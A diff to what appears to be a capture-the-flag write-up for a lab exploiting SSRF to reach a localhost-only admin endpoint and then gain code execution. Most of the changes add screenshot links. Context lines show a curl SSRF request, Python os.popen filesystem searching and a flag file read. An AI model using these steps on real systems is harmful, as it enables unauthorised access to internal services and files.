@@ -263,6 +263,12 @@ By computing the PIN and forging the cookie client-side, the exhaustion lockout 
 curl "http://10.65.161.138/download?id=1&server=http://127.0.0.1:8087/admin?" \
   --output flag.pdf
 ```
+
+![Nmap Scan](flag2.png)
+
+![Nmap Scan](flag2_0.png)
+
+
 3. Request originates from localhost — IP check satisfied — flag PDF returned
 
 **Impact:** Full bypass of localhost access control. Attacker can access any internal HTTP service.
@@ -328,6 +334,8 @@ import os; os.popen('find / -name "*.txt" 2>/dev/null | grep -vE "proc|sys|lib|s
 open('/usr/src/app/flag-982374827648721338.txt').read()
 # → 'THM{SSRF2RCE_2_1337_4_M3}'
 ```
+
+![Nmap Scan](3rd_flag.png)
 
 **Impact:** Full root-level RCE inside Docker container. Attacker can read all files, spawn reverse shells, pivot to internal services, and destroy the application.
 
